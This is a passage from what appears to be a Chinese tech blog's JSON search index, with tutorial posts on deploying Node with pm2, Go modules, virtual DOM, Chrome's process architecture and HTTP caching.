若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/mac-software-use/","summary":"\u003cp\u003eMac日常或者办公软件的使用\u0026hellip;\u003c/p\u003e","title":"工具: Mac软件使用"},{"content":" 一、环境配置 centOS 安装 node \u0026amp; 配置全局变量\n1.centos 安装 node 注意：安装和配置过程，使用baseUser用户，而不是root用户\n安装\u0026amp;解压\n// 处理上传的 xx-linux-x64.tar.xz包 [baseuser@SHTL009065205 ~]$ cd /tmp [baseuser@SHTL009065205 tmp]$ mv node-v16.13.0-linux-x64.tar.xz ../node [baseuser@SHTL009065205 node]$ xz -d node-v16.13.0-linux-x64.tar.xz [baseuser@SHTL009065205 node]$ tar xf node-v16.13.0-linux-x64.tar 配置环境变量或软链\n// 设置软链 [baseuser@SHTL009065205 ~]$ ln -sv /node/node-v16.13.0-linux-x64/bin/npm /usr/local/bin/ [baseuser@SHTL009065205 ~]ll /usr/local/bin/ [baseuser@SHTL009065205 ~]ln -sv /node/node-v16.13.0-linux-x64/bin/node /usr/local/bin/ [baseuser@SHTL009065205 ~]ll /usr/local/bin/ 注意：最好配置环境变量，不要设置软链\n// 配置环境变量 [baseuser@SHTL009065205 ~]$ cd node [baseuser@SHTL009065205 node]$ vim /etc/profile // 设置node\u0026amp;npm环境变量 [baseuser@SHTL009065205 ~]$ vim .bash_profile .bash_profile文件末尾添加\nexport NODE_HOME=/node/node-v16.13.0 // NODE_HOME后面的值要添加到自己的node解压的路径 export PATH=$NODE_HOME/bin:$PATH [baseuser@SHTL009065205 ~]$ source .bash_profile // 刷新配置文件 [baseuser@SHTL009065205 ~]$ node -v [baseuser@SHTL009065205 ~]$ npm root -g // 查看全局package的安装位置 2.pm2的安装及命令 [baseuser@SHTL009065205 ~]$ npm install pm2 -g // 全局安装 [baseuser@SHTL009065205 ~]$ pm2 --version 常用的 pm2 命令，详见官网\n$ pm2 start bin/www // bin 目录下的www入口文件 $ pm2 list // 显示所有服务 // \u0026lt;\u0026gt;符号内为可选输入 例：pm2 stop www 或者 pm2 stop 0 $ pm2 stop \u0026lt;app_name|id|\u0026#39;all\u0026#39;|json_conf\u0026gt; // 停止服务 $ pm2 restart \u0026lt;app_name|id|\u0026#39;all\u0026#39;|json_conf\u0026gt; // 重启服务 $ pm2 delete \u0026lt;app_name|id|\u0026#39;all\u0026#39;|json_conf\u0026gt; // 删除服务 $ pm2 logs // 打印日志 二、启用Node服务访问静态资源 1.express 安装 4.0以上express 要注意，必须安装express-generator\n安装\n$ npm install -g express $ npm install express-generator -g $ express --version // 检查版本 server.js\n// app.js const express = require(\u0026#39;express\u0026#39;) //创建web服务器 const app = express() //导入gzip包 const compression = require(\u0026#39;compression\u0026#39;) //文件操作 const fs = require(\u0026#39;fs\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const chalk = require(\u0026#39;chalk\u0026#39;) //启用gzip中间件,在托管之前 app.use(compression()) //托管静态资源 app.use(express.static(path.resolve(__dirname, \u0026#39;./dist\u0026#39;))) app.get(\u0026#39;/\u0026#39;, function(req, res) { const html = fs.readFileSync(path.resolve(__dirname, \u0026#39;./dist/index.html\u0026#39;), \u0026#39;utf-8\u0026#39;) res.send(html) }) app.get(\u0026#39;/home\u0026#39;, function(req, res) { const html = fs.readFileSync(path.resolve(__dirname, \u0026#39;./dist/index.html\u0026#39;), \u0026#39;utf-8\u0026#39;) res.send(html) }) //启动web服务器 app.listen(8888, res =\u0026gt; { console.log(chalk.yellow(\u0026#39;Start Service On 8888\u0026#39;)) }) 启用\n$ node server.js // 或pm2 server.js 通过 localhost:8888 访问其目录下build好 /dist 静态资源\n2.koa2 搭建本地服务器参考：https://blog.csdn.net/Smile_666666/article/details/107269299\n安装\n$ npm install -g koa $ koa2 --version $ npm install koa-static -S server.js\n// app.js const Koa = require(\u0026#39;koa\u0026#39;) //创建web服务器 const app = (module.exports = new Koa()) // const chalk = require(\u0026#39;chalk\u0026#39;) //托管静态资源 app.use(require(\u0026#39;koa-static\u0026#39;)(__dirname + \u0026#39;/dist\u0026#39;)) //启动web服务器 app.listen(8888, res =\u0026gt; { // console.log(chalk.yellow(\u0026#39;Start Service On 8888\u0026#39;)) console.log(\u0026#39;Start Service on 8888!\u0026#39;) }) 启用\n$ node server.js // 或pm2 server.js 通过 localhost:8888 访问其目录下build好 /dist 静态资源\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-pm2/","summary":"一、环境配置 centOS 安装 node \u0026amp; 配置全局变量 1.centos 安装 node 注意：安装和配置过","title":"Node: pm2管理Node服务启动静态build打包文件"},{"content":"介绍包的相关概念以及使用方法\u0026hellip;\n在golang中，所有源文件都属于一个包，golang的包具有以下特性：\n包可以被其他包引用 每个golang程序只有一个main包 包的主要用途是提高代码的可复用性 一、GOPATH环境变量 1.什么是GOPATH？ golang包的使用依赖一个重要的环境变量：GOPATH，无论是自己的代码还是第三方代码，都以GOPATH作为工作目录和一套完整的工程目录规则。GOPATH目录约定有三个子目录，主要用于:\nsrc：存放各种包源代码，src里的一个目录就是一个包 pkg：存放编译源代码后的类库 bin：存放编译源代码后的可执行程序 GOPATH允许多个目录，设置多个目录时，需要使用环境变量分隔符来区分。Unix/Linux的环境变量分隔符是英文输入法下的冒号:，windows的环境变量分隔符是英文分号;\n使用GOPATH时，golang会在以下目录中搜索包：\nGOROOT/src：该目录保存了Go标准库里代码 GOPATH/src：该目录保存了应用自身的代码和第三方依赖的代码 2.设置GOPATH环境变量 在Unix/Linux中，使用sudo vim/etc/profile打开系统profile文件，并追加以下内容设置GOPATH环境变量，同时设置GO111MODULE为关闭状态，GO111MODULE环境变量我们在文章中后面部分说明\n$ export GOPATH=/Users/pan/go # 把自己的golang项目目录作为GOPATH的变量 $ export GO111MODULE=off # 关闭golang 11.1 版本以后的模块功能 使用source /etc/profile命令重新加载环境变量\n3.包的使用 3.1 main包与包的引入 引入系统包 我们可以通过package关键字定义一个包，使用import引入其他包，如果需要引入多个包，可以将各个包声明在括号内\npackage main import ( // 引入系统的包 \u0026#34;fmt\u0026#34; ) func main() { // 调用系统包的函数 fmt.Println(\u0026#34;Hello World\u0026#34;) } 在以上代码中，我们通过main关键字定义了main包，主函数main必须位于main包下。程序中引入了fmt包，该包由golang本身提供。\n引入自定义包 我们在GOPATH/src目录下创建两个文件: 文件1，库文件位于jkdev.cn/test/mypkg/lib.go，添加以下代码\npackage mypkg import \u0026#34;fmt\u0026#34; func TestFunc() { fmt.Println(\u0026#34;call testFunc\u0026#34;) } 文件2，主文件jkdev.cn/test/main.go，添加以下代码\npackage main // 引入自定义包 import \u0026#34;jkdev.cn/test/mypkg\u0026#34; func main() { // 调用自定义包的函数 mypkg.TestFunc() } 自定义的包由我们自己定义，但要注意的是，一个目录对应一个包，同时，包名应当和目录名一致。引入包时，路径相对应GOPATH/src，我们可以根据自己的程序的功能模块划分不同的包\n3.2 包的作用域 包内：在同一个包内定义的函数、变量、常量、结构体，可以被包内的所有其他代码任意访问，它们属于包内公开。 包外：如果函数、变量、常量、结构体位于不同的包下，如果将它们的首字母使用大写标识，表示它们是公开访问的。对于结构体字段。如果想要在包外进行访问，还要让结构体字段变量名使用首字母大写。 二、编译 golang中go build命令主要用于编译代码。在包的编译过程中，若有必要，会同时编译与之相关联的包。\n假设我们的设置GOPATH是/Users/pan/go，我们在GOPATH之下的src创建创建代码test目录，并添加lib.go和main.go两个文件。此时，源文件相对于GOPATH的路径如下。接下来我们对这两个go源文件进行编译\ngo GOPATH目录 ├─src 源码目录 │ ├─test 项目目录 │ ├─lib.go 公共函数文件 │ └─main.go 主函数文件 lib.go代码如下：\npackage main import \u0026#34;fmt\u0026#34; func testFunc() { fmt.Println(\u0026#34;call testFunc\u0026#34;) } main.go代码如下：\npackage main func main() { testFunc() } 示例中的两个源文件都属于main包，所以在main.go文件中能正常引入lib.go文件\n1.go build 1.1 无参数编译 无参数编译不依赖GOPATH，需要在源码目录下进行编译\n# 进入源码目录 $ cd ~/go/src/test # 编译代码 $ go build 我们还可以-o指定编译后输出的可执行文件的文件名，如下\n$ go build -o main 1.2 go build 文件列表 使用“go build+文件列表”编译时，文件列表中的每个文件必须是同一个包的Go源码\n# 进入源码目录 $ cd ~/go/src/test # 编译 $ go build lib.go main.go 1.3 go build 包 包的路径相对于GOPATH，“go build+包”编译时，源文件需要存放在GOPATH/src下的路径，但是我们可以在任意有读写权限的目录执行编译命令，如下\n# test 相对于GOPATH/src $ go build test 2.go install 与go build具有相似功能的是go install命令，go install用来生成库和工具并存放于GOPATH中。\n一是编译包文件（无main包），将编译后的包文件放到pkg目录下（GOPATH/pkg）。 二是编译生成可执行文件（有main包），将可执行文件放到 bin目录（GOPATH/bin） 3.go build 和 go install 对比 相同点：\n都能生成可执行文件 不同点：\n\u0026amp; 包文件 可执行文件目录 go build 不能生成包文件 生成可执行文件在当前目录下 go install 可以生成包文件 生成可执行文件在bin目录下($GOPATH/bin) 三、Go模块 golang在1.11版本引入Go Modules，也叫做Go模块，模块依赖于上文提到的GO111MODULE环境变量。它是golang官方提供的包管理工具，通过Go Modules，我们可以不必将项目放在GOPATH上\n1.GO111MODULE环境变量 用环境变量GO111MODULE设置开启或者关闭模块支持，它有三个可选值：off、on、auto，默认是auto\nGO111MODULE=off：无模块支持，go会从GOPATH寻找包。 GO111MODULE=on：模块支持，根据go.mod文件下载依赖 GO111MODULE=auto：在$GOPATH/src外面且项目根目录有go.mod文件时，自动开启模块支持 在使用模块的时候，GOPATH是无意义的，但golang还是会把下载的依赖存储于GOPATH之下\nGO111MODULE配置参考 Go常用命令示例 | Gitee\n2.使用go模块 使用Go Modules时，我们先将GO111MODULE设置为on或者auto，Go Modules和GOPATH不同，不需要包含固定的三个字目录。一个空的源代码目录，只要初始化好go.mod文件，就可以定义一个Module。我们可以使用以下命令创建一个新的Module\n# 创建一个空的工作目录 mkdir -p ~/Work/go/test # 进入工作目录 cd ~/Work/go/test # 初始化一个module go mod init testmodule 我们可以看到自动生成的go.mod文件的内容如下\nmodule testmodule go 1.16 2.1 下载依赖 Go Modules会为我们进行包管理，并自动更新go.mod文件，如果需要引入新的依赖，我们只需要在终端执行go get 包名即可引入第三方包，如\n$ go get github.com/satori/go.uuid 执行命令后，Go Modules会从我们在安装golang时设置的GOPROXY镜像仓库地址去下载对应的包，安装完成之后我们看到go.mod已经发生变化，如下\n$ module testmodule go 1.16 require github.com/satori/go.uuid v1.2.0 # indirect 我们也可以先编辑好go.mod文件，然后在终端使用go mod download，golang会自动帮我们下载依赖包到本地。如果我们需要引入多个包，将所有包名卸载括号内，如下代码\nmodule testmodule go 1.16 require ( github.com/satori/go.uuid v1.2.0 // indirect gorm.io/gorm v1.21.11 // indirect ) 2.2 更新依赖关系 使用go mod tidy更新依赖关系，该命令拉取缺少的模块，移除不用的模块。Go Modules可以轻易地进行一个包的依赖管理和版本控制，go build和go install将自动使用go.mod中的依赖关系，减少了GOPATH管理时的复杂性\n四、常见配置错误 1、导入非标准库 开发中，想使用一个【不是标准库module】的内容，这个库可能是我们自己定义的util工具或者其他公共业务的抽离封装等。\n非标准库不在GOROOT里(一般我们不会修改GOROOT中的内容)\n例如，我们想导入上图中myUtils包，运行go run xxx常会遇到以下错误提示：\nmain.go:5:2: cannot find package \u0026#34;package_xxx\u0026#34; in any of: /usr/local/go/src/package_xxx (from $GOROOT) /Users/lianpf/go/src/package_xxx (from $GOPATH) 解决方式有两种：\n设置GOPATH + GO111MODULE=off 使用go.mod且go版本大于13 1.1 设置GOPATH + GO111MODULE=off 前提：设置GOPATH，保障上图中go_package项目在$GOPATH/src开发。 设置：GO111MODULE=off 原理：go的编译器会在$GOPATH/src下面寻找对应的模块，src下的每一个目录都可对应一个模块，目录中的目录也可是一个模块。\n所以，当我们需要访问模块myUtils时，只需要使用如下代码：\nimport ( \u0026#34;fmt\u0026#34; \u0026#34;go_package/myUtils\u0026#34; // $GOPATH/src层级下的目录结构 ) 1.2 使用go.mod且go版本大于13 在Golang1.11版本前，自定义包必须把项目放在GOPATH目录。Go1.11版本后使用go mod管理项目，不需要非得把项目放到GOPATH指定目录下。Go1.13后可以彻底不要GOPATH了\n这里设置：GO111MODULE=on\n第一步：初始化一个go.mod\n# go_package 可以是任意的名称(建议和项目目录名保持一致) $ go mod init go_package go.mod文件示例：\n第二步：引入模块myUtils，以go_package(即上一步初始化定义的package name)开头，后接模块路径。示例：\nimport ( \u0026#34;fmt\u0026#34; \u0026#34;go_package/myUtils\u0026#34; // go_package是上一步初始化定义的package name ) 运行，查看效果。\n参考 go语言中包的使用.掘金 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-env-compile-modules/","summary":"\u003cp\u003e介绍包的相关概念以及使用方法\u0026hellip;\u003c/p\u003e","title":"Go: 环境变量、编译和模块"},{"content":"欢迎来到 曜灵 的个人博客。\n博主目前就职于X集团上海研发中心-平台工具组，是一名软件开发工程师。主要涉及到如下技术领域：\n计算机基础（设计模式、算法、计算机网络、浏览器原理） React技术栈 \u0026amp; Vue技术栈 Hybrid 工程化（webpack/vite构建打包、node自动化部署） Node BFF层相关 Go Web编程 工作之余，一直在公共的领域为社区尽些绵薄之力，现有若干独立的开源项目：\nreact PC 组件库react-pc-ui 脚手架：选择 template 快速搭建 webpack + react + vue项目 @lianpf/create-app-cli Monaco Editor：微软开源项目 monaco-editor 二次封装Vue版 @lianpf/monaco-editor-vue Node框架：基于Koa2和Egg的Apr 希望和大家一起成长，可以通过以下方式联系博主：\ngitHub: lianpf 微信公众号：连先生有猫病 知乎：曜灵 邮箱：wanderlian@outlook.com 最后，欢迎大家关注博主的微信公众号，获取最新文章的输出信息。同时也欢迎小伙伴们，通过微信公众号获取【博主微信】投稿，文章内容不局限于技术！\n","permalink":"https://lianpf.github.io/about/","summary":"欢迎来到 曜灵 的个人博客。 博主目前就职于X集团上海研发中心-平","title":"🙋🏻‍♂️关于我"},{"content":"渲染流水线中，DOM树本身的缺陷很容易引起重排、重绘等性能问题，后来有了虚拟DOM的\u0026hellip;\n一、DOM树 1、聊一下DOM 网络进程获取到的html字节流无法直接被渲染进程理解，需要转化成渲染引擎可以理解的结构。即DOM。有以下作用：\n表述HTML的内部数据结构 将Web⻚面和JavaScript脚本连接起来 DOM解析阶段即过滤一些不安全的内容 渲染引擎内部通过HTML解析器(HTMLParser)将HTML字节流转化为DOM结构\n2、DOM的具体生成流程： 网络进程和渲染进程建立一个流式管道，HTML解析器直接解析， 不需要等待text/html类型的接口接受完毕再进行解析\n图：字节流转换为DOM\n第一个阶段，通过分词器将字节流转换为Token 第二个和第三个阶段同步进行，需要将Token解析为DOM节点，并将DOM节点添加到DOM 树中 HTML解析器开始工作时，会默认创建了一个根为document的空DOM结构。同时会将一个StartTag document的Token压入栈底。然后经过分词器解析出来的第一个StartTag html Token会 被压入到栈中，并创建一个html的DOM节点，添加到document上\n图：解析到StartTag html时的状态\n图：解析出第一个文本Token时的状态\n图：元素弹出Token栈示意图\n3.DOM缺陷：DOM树构建被JS和CSS文件影响 JavaScript文件的下载过程会阻塞DOM解析\n预解析操作：如果JavaScript文件中没有操作 DOM相关代码，就可以将该JavaScript脚本设置为异步加载，通过async 或defer来标记代码\n\u0026lt;script async type=\u0026#34;text/javascript\u0026#34; src=\u0026#39;foo.js\u0026#39;\u0026gt;\u0026lt;/script\u0026gt; JavaScript会阻塞DOM生成，而样式文件又会阻塞JavaScript的执行\n二、虚拟DOM：虚拟DOM和实际的DOM有何不同？ Javascript直接操作DOM可能会引起重排、重绘等操作(强制同步布局和布局抖 动)引起性能问题。虚拟DOM作为中间层来优化dom的操作(批量更新dom，优化更新dom细节)。之后从双缓存和MVC模型的⻆度来解析了虚拟DOM\n频繁DOM操作非常消耗浏览器性的，虚拟DOM核心是将批量DOM操作后的变化一次性更新到浏览器\n1、DOM缺陷及虚拟DOM是如何解决的 1.DOM的一些缺陷\n通过 JavaScript操纵DOM是会影响到整个渲染流水线的 使用DOM提供的JavaScript接口来遍历或者修改节点 以上两种操作都会引起重排、重绘或合成操作“牵一发而动全身”。另外，DOM中不当操作还可能引发强制同步布局和布局抖动问题，大大降低渲染效率。\n2.虚拟DOM是如何解决这些缺陷\n⻚面改变的内容应用到虚拟DOM上，不是直接应用到DOM上 变化应用到虚拟DOM上时，虚拟DOM并不急着去渲染⻚面，而是调整虚拟DOM的内部状态 在虚拟DOM收集到足够的改变时，把这些变化一次性应用到真实的DOM上 图：结合React流程虚拟DOM执行流程\n创建阶段：依据JSX和基础数据创建出来虚拟DOM，由虚拟DOM树创建出真实DOM树，再触发渲染流水线输出⻚面 更新阶段：数据变更，根据新数据创建新的虚拟DOM树，结合React Fiber更新机制找出变化的地方，把变化的地方一次性更新到真实的DOM树上，触发渲染流水线 比较两个虚拟DOM的过程是在一个递归函数里执行的，其 核心算法是reconciliation。通常情况下，这个比较过程执行得很快，不过当虚拟DOM比较复杂时，执行比较函数可能占据主线程比较久的时间，导致其他任务的等待，造成⻚面卡顿。为了解决这个问题，React团队重写了reconciliation算法，新的算法称为Fiber reconciler，之前老的算法称为Stack reconciler。协程的别称就是Fiber，所谓的Fiber reconciler就是在执行算法的过程中出让主线程\n2、在双缓存和MVC的视⻆来聊聊虚拟DOM （1）双缓存\n图像操作复杂的页面中，完整的画面需要多次计算完成。所以，当屏幕从前缓冲区读取数据显示的时候，可能拿到的是只计算了一部分的图像，就会造成用户看到的图像是一部分一部分显示出来的，也就是页面的闪烁。\n使用双缓存，计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定\n在这里，你可以把虚拟DOM看成是DOM的一个buffer，和图形显示一样，它会在完成一次完整的操作之 后，再把结果应用到DOM上，这样就能减少一些不必要的更新，同时还能保证DOM的稳定输出\n（2）MVC模式\n可以把React中虚拟DOM的部分看成是一个MVC中的视图，结合Redux提供的控制器和模型构建一个MVC的模型结构，如下图所示：\n图：基于React和Redux构建MVC模型\n控制器用来监控DOM的变化，一旦DOM发生变化，控制器便会通知模型，让其更新数据 模型数据更新后，控制器通知视图，告诉它模型的数据发生了变化 视图接收到更新消息后，根据模型所提供的数据来生成新的虚拟DOM 新的虚拟DOM生成好后，与之前的虚拟DOM进行比较，找出变化的节点 比较出变化的节点后，React将变化的虚拟节点应用到DOM上，触发DOM节点更新 DOM节点的变化触发后续一系列渲染流水线变化，从而实现⻚面的更新 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/09.dom-tree-and-virtual-dom-tree/","summary":"\u003cp\u003e渲染流水线中，DOM树本身的缺陷很容易引起重排、重绘等性能问题，后来有了虚拟DOM的\u0026hellip;\u003c/p\u003e","title":"浏览器: DOM树和虚拟DOM树"},{"content":"宏观视角下，聊一下浏览器，为什么打开1个页面，却有4个进程? 以及为什么Chrome结构会发展成如今的多线程模式?\nchrome、微软的Edge以及国内的大部分主流浏览器，都是基于Chromium二次开发而来\n点击Chrome浏览器右上角”选项-\u0026gt;更多工具-\u0026gt;任务管理器“，查看进程\n一、几个概念：进程、线程和并行处理 进程：一个进程就是一个程序的运行实例 线程：线程是不能单独存在的，由进程来启动和管理 并行处理：计算机中的并行处理就是同一时刻处理多个任务。多线程可以并行处理任务 启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程。这样的一个运行环境叫进程\n图：单线程与多线程的进程对比图\n显然，线程是依附于进程的，而进程中使用多线程并行处理能提升运行效率\n进程和线程之间的关系有4点：\n进程中的任一线程执行出错，都会导致整个进程崩溃 线程之间共享进程中的数据 进程关闭，操作系统会回收进程所占用的内存 进程正常退出 某线程操作不当导致内存泄漏，至进程退出 进程之间内容相互隔离。进程之间的数据通信，依赖进程间通信(IPC)机制 图：线程之间共享进程中的数据示意图\n上图示，线程1、线程2、线程3分别把执行的结果写入A、B、C中，然后线程2继续从A、B、C中读取数据，用来显示执行结果\n进程隔离特效：\n每一个进程只能访问自己占有的数据，避免出现进程A写入数据到进程B的情况。 进程之间的数据是严格隔离的，所以一个进程如果崩溃了，或者挂起了，是不会影响到其他进程的 二、浏览器发展史 几大模块：网络、插件、JavaScript运行环境、渲染引擎和⻚面\n1、单进程浏览器 浏览器所有功能模块都运行在一个进程里\n图：单进程浏览器架构示意图\n所有⻚面的渲染模块、JavaScript执行环境以及插件都运行在同一个页面线程中，意味着同一时刻只能有一个模块可以执行。脚本、插件甚至页面内存泄漏都是单进程变慢的重要原因\n问题：\n不稳定: 插件的意外崩溃、渲染引擎模块执行复杂JavaScript导致崩溃 不流畅: 脚本无限循环、页面内存泄漏、页面关闭内存无法完全回收导致内存占用高 不安全: 插件和⻚面脚本 通过插件可以获取到操作系统的任意资源，当你在⻚面运行一个插件时也就意味着这个插件能完全操作你的电脑。如果是个恶意插件，那么它就可以释放病毒、窃取你的账号密码，引发安全性问题\n⻚面脚本可以通过浏览器的漏洞来获取系统权限，对你的电脑做一些恶意的事情，同样也会引发安全问题\n2、多进程浏览器时代: 08年Chrome发布时的进程架构 图：早期Chrome进程架构图\n如图所示：\nChrome的⻚面运行在单独的渲染进程中 ⻚面里的插件也运行在单独的插件进程中 进程之间是通过IPC机制进行通信(如图中虚线部分) (1) 解决不稳定问题\n进程相互隔离，当一个⻚面或者插件崩溃时，影响到的仅仅是当前的⻚面进程或者插件进程，并不会影响到浏览器和其他⻚面。避免⻚面或者插件的崩溃导致整个浏览器崩溃。\n(2) 解决不流畅的问题\nJavaScript运行在渲染进程中，所以即使JavaScript阻塞了渲染进程，影响到的也只是当前的渲染⻚面，而并不会影响浏览器和其他⻚面。其他⻚面的脚本是运行在它们自己的渲染进程中的\n内存泄漏的解决方法：关闭一个⻚面，整个渲染进程会被关闭，该进程所占用的内存都会被系统回收，这样就解决了浏览器⻚面的内存泄漏问题\n(3) 安全问题\nChrome把插件进程和渲染进程锁在安全沙箱里面，这样即使在渲染进程或者插件进程里面执行了恶意程序，恶意程序也无法突破沙箱去获取系统权限\n3、多进程浏览器时代: 21年最新的Chrome进程架构图 图：最新的Chrome进程架构图（21年）\n最新的Chrome浏览器包括: 1个浏览器(Browser)主进程、1个 GPU 进程、1个网络 (NetWork)进程、多个渲染进程和多个插件进程\n浏览器进程：负责界面显示、用戶交互、子进程管理，提供存储等功能 渲染进程: 核心任务是将 HTML、CSS 和 JavaScript 转换为用戶可以与之交互的网⻚，排版引擎Blink和 JavaScript引擎V8都是运行在该进程中，默认情况下，Chrome会为每个Tab标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下 GPU进程：使用初衷是为了实现3D CSS的效果，随后网⻚、Chrome的UI界面都选择采用GPU来绘制 网络进程：页面网络资源加载 插件进程：插件运行 所以这就是为什么：仅仅打开了1个⻚面，为什么有4个进程？\n因为打开1个⻚面至少需要1个网络进程、1个浏览器进程、1个GPU进程以及1个渲染进程\n多进程模型提升了浏览器的稳定性、流畅性和安全性。但也面临一些问题：\n更高的资源占用: 每个进程都会包含公共基础结构的副本(如JavaScript运行环境)，意味着浏览器会消耗更多的内存资源 更复杂的体系架构: 浏览器各模块之间耦合性高、扩展性差等问题，会导致现在的架构已经很难适应新需求 对于上面这两个问题，Chrome团队一直在寻求一种弹性方案，既可以解决资源占用高的问题，也可以解决 复杂的体系架构的问题 面向服务的架构\n4、未来面向服务的架构（SOA） 面向服务的架构：各种模块会被重构成独立的服务(Service)，每个服务 (Service)都可以在独立的进程中运行，访问服务(Service)必须使用定义好的接口，通过IPC来通信。最终要把UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务\n图：Chrome“面向服务的架构”进程模型图\n同时提供灵活的弹性结构，在强大性能设备上会以多进程的方式运行基础服务。在资源受限的设备上，Chrome会将很多服务整合到一个进程中，从而节省内存占用\n图：在资源不足的设备上，将服务合并到浏览器进程中\nChrome的架构体系变得越来越复杂，架构的复杂性倒逼Chrome开发团队必须进行架构的重构，最终Chrome团队选择了面向服务架构(SOA)形式。从而构建一个更内聚、松耦合、易于维护和扩展的系统，更好实现 Chrome 简单、稳定、高速、安全的目标\n参考 浏览器工作原理与实践.李兵 浏览器工作原理.tim笔记 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/chrome-framework/","summary":"宏观视角下，聊一下浏览器，为什么打开1个页面，却有4个进程?","title":"浏览器: Chrome架构-打开了1个⻚面，却有4个进程？"},{"content":"http和TCP的关系? 什么是 HTTP协议？建立在TCP连接基础之上，一种允许浏览器向服务器获取资源(JavaScript、CSS、图片等)的协议\u0026hellip;\n完整的HTTP请求包括两个过程：\n浏览器端发起HTTP请求流程 服务器端处理HTTP请求流程 一、 浏览器端发起HTTP请求流程 构建请求 查找缓存：缓解服务器端压力、快速资源加载 缓存查找失败，进入网络请求过程：准备IP地址和端口 等待、建立TCP队列 发送HTTP请求 1、浏览器缓存 一种在本地保存资源副本，以供下次请求直接使用的技术\n当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会拦截请求，返回该资源的副本，并直接结束请 求，而不会再去源服务器重新下载。若缓存查找失败，则进入网络请求过程\n好处：\n缓解服务器端压力 实现资源快速加载 2、缓存查找失败，进入网络请求过程：准备IP地址和端口 浏览器使用HTTP协议作为应用层协议，封存请求的文本信息。且使用TCP/IP作为传输层协议将其发布到网络上。\nHTTP的内容是通过TCP的传输数据阶段来实现的，在HTTP工作开始之前，浏览器需要通过TCP与服务器建立连接\n数据包都是通过IP地址传输给接收方，所以我们需要域名系统DNS（Domain Name System），根据域名和IP地址的映射关系，获取到主机IP\n真正的第一步浏览器会请求DNS返回域名对应的IP，当然浏览器还提供了DNS数据缓存服务，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求 域名系统(DNS)\n3、等待、建立TCP队列 Chrome有个机制，同一个域名同时最多只能建立6个TCP连接。即在同一个域名下同时有10个请求发生，那么其中4个请求会进入排队等待状态，直至进行中的请求完成。如果当前请求数量少于6，会直接进入下一步，建立TCP连接\nHTTP工作开始之前，浏览器通过TCP与服务器建立连接——三次握手\n4、 发送HTTP请求 建立了TCP连接，浏览器就可以和服务器进行通信了。而HTTP中的数据正是在这个通信过程中传输的\n请求行： 告诉服务器浏览器需要什么资源 包括请求方法、请求URI(Uniform Resource Identifier)和HTTP协议版本 请求头：把浏览器的一些基础信息告诉服务器，比如：浏览器所使用的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie信息等 请求体：Post请求，等发送一些数据给服务器 二、服务器端处理HTTP请求流程 curl命令查看\n返回请求 断开连接 重定向 1、返回请求 curl命令curl -i https://time.geekbang.org/查看返回请求数据\ni是为了返回响应行、响应头和响应体的数据。-I表示只获取响应头和响应行数据，不需要获取响应体的数据\n响应行：包含协议版本和状态码 响应头：包含服务器信息，比如服务器生成返回数据的时间、返回的数据类型(JSON、HTML、流媒体等类 型)，以及服务器要在客戶端保存的Cookie等 响应体：包含了HTML的实际内容 2、断开连接 通常情况下，一旦服务器向客戶端返回了请求数据，它就要关闭 TCP 连接。但可配置Connection:Keep-Alive长连接，TCP连接在发送后将仍保持打开状态，浏览器就可以继续通过同一个TCP连接发送请求\n保持TCP连接可以省去下次请求时需要建立连接的时间，提升资源加载速度\n3、重定向操作 需要重定向的网址正是包含在响应头的Location字段\n三、几个问题 1、HTTP请求流程: 为什么很多站点第二次打开速度会很快 主要原因是第一次加载⻚面过程中，DNS缓存、页面资源缓存\nDNS缓存比较简单，就是在浏览器本地把对应的IP和域名关联起来\n浏览器资源缓存处理的过程： 第一次请求，服务器返回HTTP响应头给浏览器时，浏览器是通过响应头中的Cache-Control字段来设置是否缓存该资源。以及Cache-Control:Max-age=2000设置该资源缓存过期时⻓。\n缓存资源还未过期的情况下, 如果再次请求该资源，会直接返回缓存中的资源给浏览 器 缓存过期了，浏览器则会继续发起网络请求，并且在HTTP请求头中带上If-None-Match:\u0026quot;4f80f-13c-3a1xb12a\u0026quot; 服务器收到请求头后，会根据If-None-Match的值来判断请求的资源是否有更新\n没有更新，就返回304状态码，相当于服务器告诉浏览器:“这个缓存可以继续使用，这次就不重复 发送数据给你了 资源有更新，服务器就直接返回最新资源给浏览器 在浏览器中访问的时候打开network面板，发现缓 存的来源有的from disk有的是from memory ???\n防止网络劫持：http在传输过程中是明文的，所以数据在传输过程中是能够被截获或者修改的\n2、登录状态如何保持？ 服务器接收到浏览器提交的信息之后，查询后台，验证用戶登录信息是否正确，如果正确的话，会生成一段表示用戶身份的字符串，并把该字符串写到响应头的Set-Cookie字段里 浏览器接收到服务器的响应头且解析，如果服务器端发送的响应头内有 Set-Cookie 的字段，那么浏览器就会将该字段的内容保持到本地。 